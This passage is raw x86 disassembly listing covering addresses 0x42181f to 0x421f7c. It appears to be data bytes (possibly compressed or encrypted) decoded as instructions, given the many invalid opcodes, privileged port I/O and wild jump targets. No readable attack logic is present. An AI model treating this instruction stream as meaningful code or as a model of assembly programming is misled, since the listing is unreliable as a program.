  42181f:	scas   al,BYTE PTR es:[edi]
  421820:	add    BYTE PTR [ebp-0x69],ch
  421823:	sbb    al,0x42
  421825:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421826:	fwait
  421827:	push   edx
  421828:	jle    0x4217b6
  42182a:	dec    edx
  42182b:	pop    edx
  42182c:	sub    BYTE PTR [edi-0x40e1c07d],dl
  421832:	adc    BYTE PTR [ebx+0x71],ah
  421835:	test   DWORD PTR [eax+ecx*8+0x295b4f0a],edi
  42183c:	mov    ebp,0x28d5442d
  421841:	xor    al,BYTE PTR [edi-0x55]
  421844:	inc    edi
  421845:	addr16 jl 0x42181a
  421848:	retf   0x6384
  42184b:	jnp    0x4217f5
  42184d:	and    eax,0xbe612d7a
  421852:	test   DWORD PTR [eax-0x8],ebx
  421855:	sar    DWORD PTR [edi],0xd2
  421858:	popa   
  421859:	push   ebx
  42185a:	adc    BYTE PTR [edx-0x77],dl
  42185d:	xor    DWORD PTR [ebx+0x7f],0x9768ed1
  421864:	ins    BYTE PTR es:[edi],dx
  421865:	lds    esp,FWORD PTR [edx+0x5f]
  421868:	std    
  421869:	sbb    eax,0x948f29b5
  42186e:	icebp  
  42186f:	mov    ebx,DWORD PTR ss:[ecx-0x18f88a3e]
  421876:	cs push 0xf
  421879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42187a:	mov    DWORD PTR [edx+0x5cba61a6],eax
  421880:	(bad)  
  421881:	pusha  
  421882:	mov    esi,0xd5eb5199
  421887:	pop    edx
  421888:	icebp  
  421889:	fcom   DWORD PTR [edi+0xe]
  42188c:	test   DWORD PTR [esi-0x2f],edx
  42188f:	or     esi,DWORD PTR [ebp+eiz*4+0x24]
  421893:	sbb    eax,0x470f7877
  421898:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421899:	mov    al,ds:0x6fc6cc96
  42189e:	inc    eax
  42189f:	rol    ch,cl
  4218a1:	shr    BYTE PTR [ebx],1
  4218a3:	xor    BYTE PTR [ebx+0x18],0xd9
  4218a7:	mov    cl,0xcc
  4218a9:	aas    
  4218aa:	dec    eax
  4218ab:	jl     0x4218e5
  4218ad:	jp     0x42186d
  4218af:	into   
  4218b0:	stos   DWORD PTR es:[edi],eax
  4218b1:	outs   dx,BYTE PTR ds:[esi]
  4218b2:	adc    BYTE PTR [edx+0x39],0x88
  4218b6:	sbb    eax,0x3354c7ec
  4218bb:	scas   eax,DWORD PTR es:[edi]
  4218bc:	adc    ebp,ebp
  4218be:	sub    DWORD PTR [ecx],esp
  4218c0:	sub    ebx,esp
  4218c2:	je     0x421874
  4218c4:	sub    BYTE PTR [edi+eiz*1-0x12813979],ch
  4218cb:	xchg   edx,eax
  4218cc:	stos   BYTE PTR es:[edi],al
  4218cd:	ret    0xd798
  4218d0:	nop
  4218d1:	dec    edx
  4218d2:	mov    WORD PTR [ecx+0x3d],?
  4218d5:	xchg   edx,eax
  4218d6:	ja     0x421865
  4218d8:	pop    edi
  4218d9:	sti    
  4218da:	(bad)  
  4218db:	in     eax,0x89
  4218dd:	add    eax,0x4d72e07c
  4218e2:	ret    0xd416
  4218e5:	mov    edx,0xc340b761
  4218ea:	inc    ecx
  4218eb:	mov    ch,0xb
  4218ed:	sub    BYTE PTR [bx+di+0x237f],dl
  4218f2:	xor    BYTE PTR [edx+0x6a9423b],ch
  4218f8:	dec    ebp
  4218f9:	(bad)  
  4218fa:	jae    0x42194f
  4218fc:	(bad)  
  4218fd:	push   edx
  4218fe:	not    DWORD PTR [eax]
  421900:	ins    DWORD PTR es:[edi],dx
  421901:	xchg   esp,eax
  421902:	dec    ecx
  421903:	mov    eax,0x7a6b8431
  421908:	loop   0x4218fe
  42190a:	test   DWORD PTR [ebx+0x30],0x7937f338
  421911:	out    dx,al
  421912:	not    BYTE PTR [eax+0x6968b026]
  421918:	clc    
  421919:	aaa    
  42191a:	ins    BYTE PTR es:[edi],dx
  42191b:	mov    edi,0xe731cfd1
  421920:	inc    ebx
  421921:	aaa    
  421922:	ins    BYTE PTR es:[edi],dx
  421923:	mov    ecx,0x8a7eb5f2
  421928:	fstp   TBYTE PTR [edi]
  42192a:	push   eax
  42192b:	sub    al,ah
  42192d:	pop    ds
  42192e:	test   DWORD PTR [edi+ebx*8+0x41],esp
  421932:	mov    ds:0x5d8561e4,eax
  421937:	push   ds
  421938:	ins    DWORD PTR es:[edi],dx
  421939:	pushf  
  42193a:	xchg   edx,eax
  42193b:	push   edx
  42193c:	fsub   QWORD PTR [ecx+edx*2-0x24b484a5]
  421943:	and    ebp,DWORD PTR [ebx-0x7001ea5a]
  421949:	inc    ebx
  42194a:	ret    
  42194b:	cmp    ecx,DWORD PTR [esi]
  42194d:	shl    DWORD PTR [edx+0x5c],1
  421950:	mov    esp,0xfb3bbdd2
  421955:	shl    BYTE PTR [esi-0x18],0x14
  421959:	xchg   esi,eax
  42195a:	inc    eax
  42195b:	data16 sub al,0x2e
  42195e:	xor    eax,0xd59a615a
  421963:	in     al,0xe9
  421965:	jns    0x42194e
  421967:	dec    ecx
  421968:	dec    ebp
  421969:	cmp    DWORD PTR [ecx+0x41cbcc24],ebp
  42196f:	loop   0x421978
  421971:	mov    al,ds:0xeb24a19b
  421976:	push   edx
  421977:	mov    bh,0x1d
  421979:	icebp  
  42197a:	and    eax,0x97839bf0
  42197f:	loopne 0x421906
  421981:	sub    ebx,ecx
  421983:	ss or  ebp,0x6e079ec4
  42198a:	retf   
  42198b:	ret    0x12d4
  42198e:	or     eax,0xf0a30283
  421993:	push   fs
  421995:	(bad)  
  421996:	jo     0x4219ee
  421998:	and    al,0x2b
  42199a:	pushf  
  42199b:	out    0x89,al
  42199d:	and    BYTE PTR [eax+0x7e],0xd4
  4219a1:	jae    0x42193c
  4219a3:	sbb    eax,0xf012ee31
  4219a8:	add    ebp,0xc2bf5b69
  4219ae:	lods   al,BYTE PTR ds:[esi]
  4219af:	ins    DWORD PTR es:[edi],dx
  4219b0:	aam    0x7e
  4219b2:	cs ins BYTE PTR es:[edi],dx
  4219b4:	mov    BYTE PTR [edx],ah
  4219b6:	fcmovu st,st(6)
  4219b8:	test   al,0x4c
  4219ba:	ficom  WORD PTR [esi+0x76]
  4219bd:	jmp    0x2dfec5fa
  4219c2:	cmp    BYTE PTR [edx+0x6f],bl
  4219c5:	lods   eax,DWORD PTR ds:[esi]
  4219c6:	es dec eax
  4219c8:	inc    esp
  4219c9:	mov    edi,0x5610679a
  4219ce:	inc    esi
  4219cf:	outs   dx,DWORD PTR ds:[esi]
  4219d0:	sar    BYTE PTR [eax],1
  4219d2:	sbb    al,0x40
  4219d4:	inc    esp
  4219d5:	cmp    al,dh
  4219d7:	sbb    ecx,ecx
  4219d9:	mov    dh,0x94
  4219db:	xchg   esi,eax
  4219dc:	fs clc 
  4219de:	mov    al,dh
  4219e0:	push   edx
  4219e1:	sbb    edi,DWORD PTR [esi+eiz*1]
  4219e4:	popf   
  4219e5:	aad    0x12
  4219e7:	xor    DWORD PTR [esi-0x6b2d5271],0x3fdb8034
  4219f1:	std    
  4219f2:	push   esp
  4219f3:	fsub   QWORD PTR [eax+0x40]
  4219f6:	bound  esp,QWORD PTR [esi-0x33]
  4219f9:	xchg   esi,eax
  4219fa:	ss pop ebp
  4219fc:	pop    es
  4219fd:	fwait
  4219fe:	iret   
  4219ff:	push   eax
  421a00:	xchg   BYTE PTR [esi+0x34],ch
  421a03:	and    ebx,DWORD PTR [eax+edx*8+0x2]
  421a07:	cmp    DWORD PTR [edx],0xffffffac
  421a0a:	test   eax,0x45002196
  421a0f:	sbb    cl,BYTE PTR [ecx]
  421a11:	push   eax
  421a12:	xlat   BYTE PTR ds:[ebx]
  421a13:	ret    0x1a4c
  421a16:	jb     0x4219da
  421a18:	sub    DWORD PTR [eax],eax
  421a1a:	xor    ebx,esp
  421a1c:	clc    
  421a1d:	sbb    BYTE PTR [ebp+0x55],bh
  421a20:	and    esi,DWORD PTR [edi+eiz*2+0x38626d1d]
  421a27:	loope  0x421a19
  421a29:	sbb    eax,0x7f25574b
  421a2e:	sub    BYTE PTR [eax],cl
  421a30:	pop    es
  421a31:	fdiv   QWORD PTR [ebx]
  421a33:	dec    eax
  421a34:	nop
  421a35:	idiv   BYTE PTR [eax+0x3195fe77]
  421a3b:	fild   WORD PTR [esi+0x5c]
  421a3e:	or     ebp,eax
  421a40:	retf   
  421a41:	mov    ecx,0xc4ce73f2
  421a46:	inc    cx
  421a48:	inc    ebp
  421a49:	adc    DWORD PTR [edx-0x6d],ebx
  421a4c:	inc    ecx
  421a4d:	fimul  DWORD PTR [edx+0x4a]
  421a50:	retf   0x2f0b
  421a53:	dec    ecx
  421a54:	jns    0x421a4d
  421a56:	rcr    BYTE PTR [ebp-0x4ebde6b],1
  421a5c:	mov    eax,ds:0xd50fd15
  421a61:	cld    
  421a62:	jp     0x4219f4
  421a64:	out    dx,eax
  421a65:	lds    edi,FWORD PTR [edi+0xef24d4f]
  421a6b:	jle    0x421a2d
  421a6d:	ds and ecx,edx
  421a70:	mov    dl,0x12
  421a72:	mov    edx,0xe15ba54e
  421a77:	lock arpl di,ax
  421a7a:	mov    dl,0xe8
  421a7c:	in     al,0x52
  421a7e:	jl     0x421a31
  421a80:	or     al,0x5b
  421a82:	sbb    eax,0xe807cc24
  421a87:	pop    esi
  421a88:	cmp    ebp,ebx
  421a8a:	fmul   DWORD PTR [edx]
  421a8c:	mov    cl,0x3c
  421a8e:	rcr    DWORD PTR [edi],0xab
  421a91:	sar    DWORD PTR [ebx+0xc],1
  421a94:	retf   
  421a95:	fcmovb st,st(1)
  421a97:	aas    
  421a98:	mov    edx,0x96a65a88
  421a9d:	xchg   ebp,eax
  421a9e:	xor    BYTE PTR [ecx+0x46],bl
  421aa1:	out    0x32,al
  421aa3:	sub    esp,edx
  421aa5:	aaa    
  421aa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421aa7:	call   0xd52318d6
  421aac:	test   BYTE PTR [esi+0x10],0x28
  421ab0:	fcmovnu st,st(2)
  421ab2:	pop    esi
  421ab3:	jge    0x421a88
  421ab5:	lock int3 
  421ab7:	mov    esi,0x8f254d40
  421abc:	push   ecx
  421abd:	fstp   TBYTE PTR [ecx-0x63]
  421ac0:	in     eax,0xb4
  421ac2:	push   eax
  421ac3:	xchg   DWORD PTR [eax-0x48],ecx
  421ac6:	sti    
  421ac7:	int3   
  421ac8:	sbb    al,0xdb
  421aca:	xor    BYTE PTR [esp+eax*1],dl
  421acd:	fs lock add dh,al
  421ad1:	pop    ecx
  421ad2:	adc    al,0xc2
  421ad4:	repnz and eax,0xa4487ab8
  421ada:	xchg   ebp,eax
  421adb:	das    
  421adc:	ins    BYTE PTR es:[edi],dx
  421add:	nop
  421ade:	repz jbe 0x421b19
  421ae1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ae2:	and    ch,BYTE PTR [ebp-0x5f9cee0b]
  421ae8:	pop    ss
  421ae9:	or     al,BYTE PTR [edx]
  421aeb:	retf   
  421aec:	xchg   esp,eax
  421aed:	aam    0x3a
  421aef:	jb     0x421ab7
  421af1:	int    0x74
  421af3:	fucomi st,st(2)
  421af5:	hlt    
  421af6:	shl    DWORD PTR [esi-0x4f],cl
  421af9:	push   es
  421afa:	xchg   ebx,eax
  421afb:	adc    ecx,edx
  421afd:	mov    BYTE PTR [ebp-0x7b2c181a],bl
  421b03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b04:	mov    edi,0x59a4d0ea
  421b09:	push   cs
  421b0a:	loop   0x421b3d
  421b0c:	jo     0x421ad1
  421b0e:	pop    eax
  421b0f:	cmp    ebx,DWORD PTR [ebp+0x55433c47]
  421b15:	cld    
  421b16:	int    0xea
  421b18:	cmc    
  421b19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b1a:	(bad)  
  421b1b:	psubw  mm0,mm2
  421b1e:	dec    edi
  421b1f:	jo     0x421b72
  421b21:	inc    ebp
  421b22:	xchg   ecx,eax
  421b23:	xchg   ebx,eax
  421b24:	mov    ah,0xcd
  421b26:	add    ecx,ecx
  421b28:	mov    DWORD PTR [edi-0x67b01eb5],esi
  421b2e:	xor    BYTE PTR [eax],0xaa
  421b31:	mov    ds:0xe50d0698,al
  421b36:	push   ecx
  421b37:	mov    bh,0xcc
  421b39:	aad    0xaf
  421b3b:	out    dx,al
  421b3c:	imul   ecx,DWORD PTR [edx],0xffffffa5
  421b3f:	pop    edx
  421b40:	and    al,0xbc
  421b42:	in     al,dx
  421b43:	shl    DWORD PTR [edx+eiz*4-0xf],cl
  421b47:	adc    esp,DWORD PTR [ebp+eiz*1-0x411017a]
  421b4e:	ds popa 
  421b50:	adc    eax,0x2a0ee6eb
  421b55:	and    DWORD PTR [edi+0x70],0xced64669
  421b5c:	and    DWORD PTR ds:0xa53698cc,edx
  421b62:	sahf   
  421b63:	mov    ds:0x750712bb,eax
  421b68:	outs   dx,DWORD PTR ds:[esi]
  421b69:	adc    DWORD PTR [eax-0x1885320c],ebx
  421b6f:	int3   
  421b70:	inc    eax
  421b71:	enter  0x8ba4,0x17
  421b75:	mov    ch,0x13
  421b77:	ret    
  421b78:	mov    al,ds:0xd7945ef0
  421b7d:	and    DWORD PTR [ebx],eax
  421b7f:	mov    ebp,0x2cf8b0b2
  421b84:	push   es
  421b85:	icebp  
  421b86:	xchg   edx,eax
  421b87:	inc    esp
  421b88:	aas    
  421b89:	call   0xb599:0x32567c2d
  421b90:	inc    ecx
  421b91:	out    0xcd,al
  421b93:	popa   
  421b94:	mov    al,ds:0x4372a33a
  421b99:	mov    ds:0x640c77e7,al
  421b9e:	data16 out 0xef,al
  421ba1:	pushf  
  421ba2:	and    eax,0xf4ee35e4
  421ba7:	inc    edi
  421ba8:	sbb    edx,ecx
  421baa:	repz or DWORD PTR [ebx+0x5a],ecx
  421bae:	mov    dl,ch
  421bb0:	enter  0x20b,0x92
  421bb4:	mov    eax,ds:0xa1caf968
  421bb9:	jo     0x421c09
  421bbb:	pop    eax
  421bbc:	imul   DWORD PTR [ecx]
  421bbe:	adc    edi,edi
  421bc0:	mov    cl,0x0
  421bc2:	cli    
  421bc3:	mov    esp,0xdb6c4697
  421bc8:	nop
  421bc9:	sbb    BYTE PTR [edi-0x4a],dl
  421bcc:	mov    edx,0xcc82c2d1
  421bd1:	mov    WORD PTR [esi+0x77038ea7],gs
  421bd7:	popa   
  421bd8:	int    0xe7
  421bda:	ja     0x421b6a
  421bdc:	adc    bh,0x83
  421bdf:	sbb    DWORD PTR [ebx],ebx
  421be1:	pop    ds
  421be2:	cs mov esp,0xeb5aaa3c
  421be8:	inc    edx
  421be9:	jbe    0x421c1a
  421beb:	pop    ebp
  421bec:	stos   DWORD PTR es:[edi],eax
  421bed:	jo     0x421b95
  421bef:	cli    
  421bf0:	sbb    DWORD PTR ds:0xd564f38e,edi
  421bf6:	ins    DWORD PTR es:[edi],dx
  421bf7:	bnd ja 0x421c75
  421bfa:	xchg   esi,eax
  421bfb:	das    
  421bfc:	xor    DWORD PTR [ebp+0x7b47b6dd],0x1738a8ae
  421c06:	jns    0x421bf2
  421c08:	add    BYTE PTR [eax],al
  421c0a:	push   esi
  421c0b:	inc    ebx
  421c0c:	pop    edx
  421c0d:	pop    ecx
  421c0e:	pop    edi
  421c0f:	pop    ecx
  421c10:	push   edi
  421c11:	dec    edi
  421c12:	mov    fs,WORD PTR [ecx+0x31e6e972]
  421c18:	push   cs
  421c19:	or     edi,edx
  421c1b:	stos   BYTE PTR es:[edi],al
  421c1c:	add    DWORD PTR [eax],eax
  421c1e:	xchg   BYTE PTR [esi],al
  421c20:	add    BYTE PTR [eax],al
  421c22:	cmp    cl,BYTE PTR [ecx]
  421c24:	call   0x9df2a4b8
  421c29:	add    al,0xe4
  421c2b:	outs   dx,BYTE PTR ds:[esi]
  421c2c:	loopne 0x421c45
  421c2e:	std    
  421c2f:	or     al,0x15
  421c31:	fld    QWORD PTR [edx*4-0xa48a5a5]
  421c38:	adc    dl,BYTE PTR [ecx-0x62]
  421c3b:	fmul   DWORD PTR [esi]
  421c3d:	jne    0x421c9d
  421c3f:	or     dh,BYTE PTR [ebx+0x3c]
  421c42:	inc    esp
  421c43:	(bad)  
  421c44:	(bad)  
  421c45:	lahf   
  421c46:	push   ecx
  421c47:	cwde   
  421c48:	mov    ah,BYTE PTR [edi+ebx*1]
  421c4b:	mov    dh,BYTE PTR [esi+0x6d4c73c8]
  421c51:	mov    ebp,edi
  421c53:	sar    BYTE PTR [ebp-0x17],0x79
  421c57:	xchg   DWORD PTR [edi],ecx
  421c59:	add    bl,BYTE PTR [ebp-0x1a534abd]
  421c5f:	or     esp,edi
  421c61:	(bad)  
  421c62:	and    eax,0xa85b7cb1
  421c67:	adc    eax,0x22be43c9
  421c6c:	aam    0x88
  421c6e:	iret   
  421c6f:	xchg   esp,eax
  421c70:	or     BYTE PTR [esi],ah
  421c72:	push   cs
  421c73:	mov    esp,0xb7c4da5b
  421c78:	xor    edi,DWORD PTR [eax]
  421c7a:	scas   al,BYTE PTR es:[edi]
  421c7b:	mov    esi,0xa59e2adf
  421c80:	push   ecx
  421c81:	sbb    al,0xcc
  421c83:	stos   DWORD PTR es:[edi],eax
  421c84:	dec    ebx
  421c85:	scas   eax,DWORD PTR es:[edi]
  421c86:	and    edx,DWORD PTR ds:0xcddcbf43
  421c8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c8d:	or     al,0x46
  421c8f:	sahf   
  421c90:	xor    al,0x4f
  421c92:	dec    ebp
  421c93:	ficomp DWORD PTR [ebp-0x55]
  421c96:	add    al,0x35
  421c98:	adc    esi,esp
  421c9a:	cmp    eax,0xd278f4b5
  421c9f:	imul   ebp,DWORD PTR [edx],0x41ea9e26
  421ca5:	mov    esp,0x9a317e0
  421caa:	popa   
  421cab:	pop    ebx
  421cac:	cmc    
  421cad:	retf   0x3bd9
  421cb0:	nop
  421cb1:	mov    cl,0x2
  421cb3:	adc    eax,0x7ecc3d2a
  421cb8:	faddp  st(7),st
  421cba:	pop    es
  421cbb:	repnz cmp BYTE PTR ds:0x6ce0b0d1,0x6c
  421cc3:	jecxz  0x421d08
  421cc5:	or     al,0xc7
  421cc7:	sub    BYTE PTR [ebp-0x2c],ah
  421cca:	cmp    eax,0xd3265c55
  421ccf:	add    ah,BYTE PTR [edi+0x4e]
  421cd2:	(bad)  
  421cd3:	hlt    
  421cd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cd5:	pop    esp
  421cd6:	in     eax,dx
  421cd7:	adc    DWORD PTR [ecx+0x42bab6e5],0x2a285d71
  421ce1:	push   ecx
  421ce2:	out    0x79,al
  421ce4:	inc    esp
  421ce5:	(bad)  
  421ce6:	jbe    0x421cee
  421ce8:	mov    cl,0xe1
  421cea:	out    0x3b,eax
  421cec:	pusha  
  421ced:	js     0x421ce1
  421cef:	pop    edx
  421cf0:	mov    dh,0x9f
  421cf2:	test   DWORD PTR [eax-0x74],ecx
  421cf5:	cmp    DWORD PTR gs:[edx+0x64],esi
  421cf9:	pop    eax
  421cfa:	jp     0x421d25
  421cfc:	mov    bl,0x9e
  421cfe:	xchg   edx,eax
  421cff:	mov    edi,DWORD PTR [ebp-0x44]
  421d02:	jnp    0x421d36
  421d04:	sbb    eax,0xf283d844
  421d09:	sbb    al,0x9
  421d0b:	or     DWORD PTR [ebp-0x1e48d182],ebp
  421d11:	xor    eax,0x4c9d9b62
  421d16:	pop    es
  421d17:	clc    
  421d18:	jns    0x421cfe
  421d1a:	outs   dx,DWORD PTR ds:[esi]
  421d1b:	leave  
  421d1c:	ficomp WORD PTR [ebx+0x22a104c6]
  421d22:	aad    0xbc
  421d24:	hlt    
  421d25:	pop    ebp
  421d26:	add    al,0xc6
  421d28:	outs   dx,BYTE PTR ds:[esi]
  421d29:	xchg   edi,eax
  421d2a:	cmp    eax,0x81359698
  421d2f:	xchg   DWORD PTR [ecx-0x50],ecx
  421d32:	mov    esp,0x6c52c60c
  421d37:	aas    
  421d38:	xchg   BYTE PTR [esi+eax*1-0x61488939],al
  421d3f:	sbb    BYTE PTR ds:[esi-0x25],0x6f
  421d44:	push   ss
  421d45:	loopne 0x421d1b
  421d47:	push   ds
  421d48:	js     0x421d0e
  421d4a:	jecxz  0x421cd4
  421d4c:	pusha  
  421d4d:	into   
  421d4e:	out    dx,eax
  421d4f:	xchg   ecx,eax
  421d50:	es push ss
  421d52:	push   ebx
  421d53:	pop    ebp
  421d54:	in     al,dx
  421d55:	sar    DWORD PTR [esi-0xbd14b4a],cl
  421d5b:	dec    edx
  421d5c:	mov    bl,0x46
  421d5e:	xchg   edi,eax
  421d5f:	push   eax
  421d60:	into   
  421d61:	cdq    
  421d62:	pop    ebx
  421d63:	xor    al,0xa1
  421d65:	mov    BYTE PTR [eax],bl
  421d67:	daa    
  421d68:	fcomp  DWORD PTR [ebx]
  421d6a:	adc    dl,BYTE PTR [ebp+0x19]
  421d6d:	mov    esp,edi
  421d6f:	repz cwde 
  421d71:	lods   eax,DWORD PTR ds:[esi]
  421d72:	bnd jle 0x421df4
  421d75:	adc    ah,BYTE PTR [esi-0x695632cd]
  421d7b:	jb     0x421d09
  421d7d:	cwde   
  421d7e:	imul   eax,DWORD PTR [ebx],0x5ac2e0c6
  421d84:	or     edi,DWORD PTR [ebp+0x568fde68]
  421d8a:	std    
  421d8b:	std    
  421d8c:	ret    0xb204
  421d8f:	sbb    bl,BYTE PTR [edi]
  421d91:	and    cl,bl
  421d93:	xor    al,0x2e
  421d95:	pop    eax
  421d96:	fldcw  WORD PTR [esi-0x850a2f7]
  421d9c:	leave  
  421d9d:	sub    DWORD PTR [edi+0x2d3751e],esi
  421da3:	(bad)  
  421da4:	retf   
  421da5:	inc    BYTE PTR [ebp+0x33]
  421da8:	xchg   ebx,eax
  421da9:	cmp    al,0x1d
  421dab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dac:	push   ds
  421dad:	mov    BYTE PTR [esi],al
  421daf:	cld    
  421db0:	fmulp  st(7),st
  421db2:	mov    ds:0x426daad2,eax
  421db7:	fmul   DWORD PTR [eax]
  421db9:	jmp    0xa6eef937
  421dbe:	fidivr WORD PTR [esi-0x1b]
  421dc1:	pop    ss
  421dc2:	adc    DWORD PTR [ecx],ecx
  421dc4:	pop    ss
  421dc5:	lods   al,BYTE PTR ds:[esi]
  421dc6:	ja     0x421e35
  421dc8:	cli    
  421dc9:	adc    eax,0x2b58cee2
  421dce:	cmp    edi,edx
  421dd0:	mov    ds:0xda560e95,eax
  421dd5:	dec    edi
  421dd6:	into   
  421dd7:	push   eax
  421dd8:	in     al,0xa9
  421dda:	test   eax,0xb81249c2
  421ddf:	enter  0xcb3a,0xa
  421de3:	xor    DWORD PTR [esi],edi
  421de5:	jle    0x421e3c
  421de7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421de8:	mov    fs,ebx
  421dea:	stos   BYTE PTR es:[edi],al
  421deb:	mov    ah,0xc9
  421ded:	fcom   st(7)
  421def:	lods   al,BYTE PTR ds:[esi]
  421df0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421df1:	out    dx,eax
  421df2:	cwde   
  421df3:	in     eax,0x2
  421df5:	test   al,0xa8
  421df7:	cmp    BYTE PTR [edi+eiz*8-0x51007b1],bl
  421dfe:	test   al,0xf2
  421e00:	mov    ds:0xe0ea6d51,eax
  421e05:	out    0xf6,al
  421e07:	out    dx,al
  421e08:	pop    ebx
  421e09:	rcl    BYTE PTR [edx+0x20],1
  421e0c:	pop    ebp
  421e0d:	int    0x48
  421e0f:	ins    BYTE PTR es:[edi],dx
  421e10:	les    esp,FWORD PTR [ecx+0x77]
  421e13:	xor    ecx,DWORD PTR [eax+0x6e079fb1]
  421e19:	add    eax,0xaa5b5ce7
  421e1e:	cs repz daa 
  421e21:	mov    al,BYTE PTR [ecx-0x2]
  421e24:	ret    0x57f3
  421e27:	pop    ebp
  421e28:	ds int3 
  421e2a:	sbb    bl,BYTE PTR [ecx*1-0x52fe2f9a]
  421e31:	push   0x1b
  421e33:	jnp    0x421dfa
  421e35:	gs (bad) 
  421e37:	xlat   BYTE PTR ds:[ebx]
  421e38:	fiadd  WORD PTR [esi+esi*2-0xd]
  421e3c:	ds jns 0x421e67
  421e3f:	mov    al,0x6d
  421e41:	stc    
  421e42:	je     0x421df9
  421e44:	sbb    eax,0xa8c43717
  421e49:	adc    DWORD PTR [ecx-0x66],esp
  421e4c:	dec    ebp
  421e4d:	clc    
  421e4e:	and    ebx,ebx
  421e50:	sbb    DWORD PTR [edx-0x1f],edx
  421e53:	sub    BYTE PTR [ebp+edi*1+0x1c197516],bh
  421e5a:	lds    ecx,FWORD PTR [edi+0x5aeab934]
  421e60:	push   esi
  421e61:	push   edi
  421e62:	sub    BYTE PTR [ebx+0x4f],bh
  421e65:	push   DWORD PTR [edi+ebx*2-0x2c]
  421e69:	mov    ebp,0x40ff3e48
  421e6e:	xor    cl,BYTE PTR [ebp+0x2b]
  421e71:	cmp    bh,BYTE PTR [edx]
  421e73:	mov    al,ds:0x6230f7e6
  421e78:	mov    bh,0xea
  421e7a:	sub    al,0x7c
  421e7c:	jge    0x421eea
  421e7e:	out    0x65,eax
  421e80:	scas   al,BYTE PTR es:[edi]
  421e81:	push   eax
  421e82:	lods   al,BYTE PTR ds:[esi]
  421e83:	push   ebx
  421e84:	jle    0x421efd
  421e86:	push   ecx
  421e87:	(bad)  
  421e88:	jno    0x421eec
  421e8a:	icebp  
  421e8b:	xchg   BYTE PTR [edx-0x47],ch
  421e8e:	mov    esi,0xf32e3227
  421e93:	lods   eax,DWORD PTR ds:[esi]
  421e94:	or     ebx,DWORD PTR [ebp+0x7f]
  421e97:	xor    al,0x77
  421e99:	scas   al,BYTE PTR es:[edi]
  421e9a:	repnz ds and edx,ebx
  421e9e:	gs jg  0x421e72
  421ea1:	jno    0x421ec9
  421ea3:	jno    0x421e9e
  421ea5:	ds icebp 
  421ea7:	push   esi
  421ea8:	retf   
  421ea9:	adc    DWORD PTR [ebp-0x71e1aa2c],edi
  421eaf:	add    DWORD PTR [esi+0x3ba0296f],edi
  421eb5:	stos   DWORD PTR es:[edi],eax
  421eb6:	dec    ecx
  421eb7:	in     al,dx
  421eb8:	push   0x9cdb8e45
  421ebd:	push   es
  421ebe:	aam    0x5
  421ec0:	ss or  eax,0x744b94b1
  421ec6:	pop    edi
  421ec7:	rcr    DWORD PTR [ebx],1
  421ec9:	or     esi,edi
  421ecb:	jne    0x421e8b
  421ecd:	pop    ds
  421ece:	jl     0x421f22
  421ed0:	out    0xe7,eax
  421ed2:	jmp    0x421e78
  421ed4:	mul    BYTE PTR [eax]
  421ed6:	dec    esp
  421ed7:	int3   
  421ed8:	jg     0x421ed9
  421eda:	lea    eax,[edi+0x17]
  421edd:	dec    ebx
  421ede:	push   ebx
  421edf:	popf   
  421ee0:	fst    QWORD PTR [ebx]
  421ee2:	aam    0x4b
  421ee4:	(bad)  
  421ee5:	ins    BYTE PTR es:[edi],dx
  421ee6:	push   ebp
  421ee7:	sub    DWORD PTR [esi+0xaaf3201],ecx
  421eed:	xchg   edi,eax
  421eee:	scas   al,BYTE PTR es:[edi]
  421eef:	imul   eax,DWORD PTR [ebx-0x1edf7baa],0x19efd014
  421ef9:	lods   al,BYTE PTR ds:[esi]
  421efa:	lods   al,BYTE PTR ds:[esi]
  421efb:	aam    0xdd
  421efd:	lods   eax,DWORD PTR ds:[esi]
  421efe:	std    
  421eff:	adc    al,0x43
  421f01:	mov    ebx,?
  421f03:	std    
  421f04:	daa    
  421f05:	cmp    al,0xb
  421f07:	push   esp
  421f08:	pop    edx
  421f09:	loopne 0x421f5c
  421f0b:	push   cs
  421f0c:	lock push ds
  421f0e:	aaa    
  421f0f:	js     0x421f4b
  421f11:	je     0x421eee
  421f13:	jmp    0x421f18
  421f15:	mov    ds:0x98a1f25f,al
  421f1a:	sbb    BYTE PTR [ecx],ch
  421f1c:	bound  eax,QWORD PTR [edi-0x5ad2a3fe]
  421f22:	jnp    0x421f31
  421f24:	repz xlat BYTE PTR ds:[ebx]
  421f26:	(bad)  
  421f28:	pop    edx
  421f29:	push   esp
  421f2a:	add    eax,0x729c7c
  421f2f:	scas   al,BYTE PTR es:[edi]
  421f30:	xor    ebx,esi
  421f32:	nop
  421f33:	sub    eax,0x448067d5
  421f38:	out    dx,al
  421f39:	pop    eax
  421f3a:	cmc    
  421f3b:	mov    bl,0xd
  421f3d:	cmp    DWORD PTR [edi+0x5381cc47],eax
  421f43:	aad    0x57
  421f45:	mov    al,0x53
  421f47:	ins    BYTE PTR es:[edi],dx
  421f48:	xlat   BYTE PTR ds:[ebx]
  421f49:	add    eax,DWORD PTR [ecx]
  421f4b:	out    0xdc,eax
  421f4d:	xor    BYTE PTR [ebx],al
  421f4f:	not    BYTE PTR [edx-0x14e85d4e]
  421f55:	imul   ebx,DWORD PTR [edi+0x45],0x19b34be8
  421f5c:	mov    dh,0xa6
  421f5e:	lods   al,BYTE PTR ds:[esi]
  421f5f:	adc    ebp,DWORD PTR [edi-0x5f]
  421f62:	inc    esp
  421f63:	or     bl,BYTE PTR [edi-0xe]
  421f66:	sbb    bl,cl
  421f68:	sub    BYTE PTR [edx+0x1a58ed89],al
  421f6e:	add    bh,BYTE PTR [eax-0x54]
  421f71:	aas    
  421f72:	outs   dx,DWORD PTR ds:[esi]
  421f73:	fs (bad) 
  421f75:	mov    ebp,DWORD PTR [ebp-0x62]
  421f78:	pop    esp
  421f79:	pmulhw mm2,QWORD PTR [edi]
  421f7c:	ficom  WORD PTR [edx+0x3f61d3e1]
